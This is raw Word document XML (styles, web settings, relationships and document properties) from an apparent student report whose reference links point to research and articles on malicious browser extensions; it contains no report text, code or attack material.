    <w:name w:val="annotation reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="001677EB"/>
    <w:rPr>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentText">
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="CommentTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="001677EB"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentTextChar">
    <w:name w:val="Comment Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="CommentText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="001677EB"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentSubject">
    <w:name w:val="annotation subject"/>
    <w:basedOn w:val="CommentText"/>
    <w:next w:val="CommentText"/>
    <w:link w:val="CommentSubjectChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="001677EB"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentSubjectChar">
    <w:name w:val="Comment Subject Char"/>
    <w:basedOn w:val="CommentTextChar"/>
    <w:link w:val="CommentSubject"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="001677EB"/>
    <w:rPr>
      <w:rFonts w:ascii="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31685">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="228224899">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="267393398">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="302199616">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="360859121">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="409693373">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="500435643">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="579800854">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="620962592">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="21035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2528">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="671025931">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="752050702">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="585577286">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="20455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30428">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="820274699">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="824785883">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="841702922">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="873612668">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="890313989">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="904031933">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="976834933">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1038897920">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1055545875">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1230849630">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1249269346">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1358700745">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1527282651">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1605722595">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1726417512">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1733893783">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1749182724">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1774013321">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1791783676">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1794664323">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1812405970">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1838839178">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1841236140">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2076003506">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="213058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s://www.ece.cmu.edu/~lbauer/papers/2014/cns2014-browserattacks.pdf" TargetMode="External"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://paginaspersonales.deusto.es/isantos/papers/2017/2017-sanchez-rola-extensions-usenix.pdf" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://courses.csail.mit.edu/6.857/2016/files/24.pdf" TargetMode="External"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://precog.iiitd.edu.in/pubs/spying-extensions-eurosandp.pdf" TargetMode="External"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-into-malicious-browser-extensions/" TargetMode="External"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://isc.sans.edu/forums/diary/CatchAll+Google+Chrome+Malicious+Extension+Steals+All+Posted+Data/22976/" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://theantisocialengineer.com/2017/07/16/exploiting-chrome-attacks-to-educate-staff/" TargetMode="Externa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file:///C:\Users\ilias\Desktop\asd\docs\report\Report_v2.docx" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="file:///C:\Users\ilias\Desktop\asd\docs\report\Report_v2.docx" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/comments" Target="comments.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s://developer.chrome.com/extensions" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.chrome.com/apps/nativeMessaging" TargetMode="External"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-kapravelos.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w="9525">
          <a:noFill/>
          <a:miter lim="800000"/>
          <a:headEnd/>
          <a:tailEnd/>
        </a:ln>
        <a:effectLst/>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3CCD6-376B-4E4A-AF86-357F65184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34</Pages>
  <Words>5948</Words>
  <Characters>33908</Characters>
  <Application>Microsoft Macintosh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39777</CharactersWithSpaces>
  <SharedDoc>false</SharedDoc>
  <HLinks>
    <vt:vector size="222" baseType="variant">
      <vt:variant>
        <vt:i4>6291503</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>225</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>http://www.w3.org/TR/SOAP/</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>6881327</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>222</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>http://www.w3.org/TR/soap12-part0/</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>458845</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>219</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>http://www.ludd.luth.se/mud/aber/mud-history.html</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>589896</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>216</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>http://slate.msn.com/id/2090114/</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2031735</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>204</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>http://www.computer.org/portal/site/ieeecs/menuitem.c5efb9b8ade9096b8a9ca0108bcd45f3/index.jsp?&amp;pName=ieeecs_level1&amp;path=ieeecs/publications/author/style&amp;file=refer.xml&amp;xsl=generic.xsl&amp;</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>3342454</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>201</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>http://wwwlib.murdoch.edu.au/find/citation/ieee.html</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>Citation%20Within%20The%20Text</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>2424953</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>198</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>http://www.computer.org/author/style/refer.htm</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2031669</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>191</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc220142395</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>2031669</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>185</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc220142394</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>2031669</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>179</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc220142393</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1966133</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>170</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc220142383</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1441840</vt:i4>
